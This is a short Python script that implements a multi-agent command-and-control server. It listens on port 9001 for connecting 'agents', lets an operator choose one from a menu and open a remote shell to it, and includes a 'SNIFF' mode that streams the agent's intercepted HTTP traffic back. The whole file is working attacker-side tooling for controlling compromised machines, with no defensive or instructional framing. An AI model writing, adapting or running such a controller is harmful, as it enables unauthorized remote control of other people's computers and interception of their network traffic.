import socket
import threading

# Listen on all interfaces
HOST = "0.0.0.0" 
PORT = 9001

# Have a server accept multiple agents
all_agents = []

def handle_new_connections(server_socket):
    while True:
        conn, addr = server_socket.accept()
        all_agents.append({"connection": conn, "address": addr})
        print(f"\n[+] New Agent: {addr}")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    
    print(f"[*] Multi-Agent Server listening on {PORT}...")
    
    # thread to accept connections while we use the menu
    threading.Thread(target=handle_new_connections, args=(server_socket,), daemon=True).start()

    while True:
        if not all_agents:
            continue

        print(f"\n--- [ {len(all_agents)} Agents Connected ] ---")
        for i, agent in enumerate(all_agents):
            print(f"[{i}] {agent['address']}")
        
        choice = input("\nSelect Agent ID (or 'exit'): ").strip()
        if choice.lower() == 'exit': break
        
        try:
            target_id = int(choice)
            conn = all_agents[target_id]["connection"]
            
            print(f"[*] Shell opened with {all_agents[target_id]['address']}. Type 'SNIFF' to see HTTP traffic")
            
            while True:
                cmd = input(f"Agent {target_id}> ").strip()
                if not cmd: continue
                if cmd.upper() == "BACK": break
                
                conn.send(cmd.encode())
                
                # We are sniffing, so we enter a loop to print the continuous data stream
                if cmd.upper() == "SNIFF":
                    try:
                        while True:
                            response = conn.recv(4096).decode(errors="ignore")
                            if not response: break
                            print(response, end="")
                    except KeyboardInterrupt:
                        print("\n[*] Exiting Live Mode...")
                        # You'll need to restart the agent if you interrupt the stream
                        break 
                else:
                    response = conn.recv(4096).decode(errors="ignore")
                    print(f"\n[RESPONSE]: {response}")

        except (ValueError, IndexError):
            print("[-] Invalid ID.")
        except Exception as e:
            print(f"[-] Agent disconnected: {e}")
            all_agents.pop(target_id)

if __name__ == "__main__":
    start_server()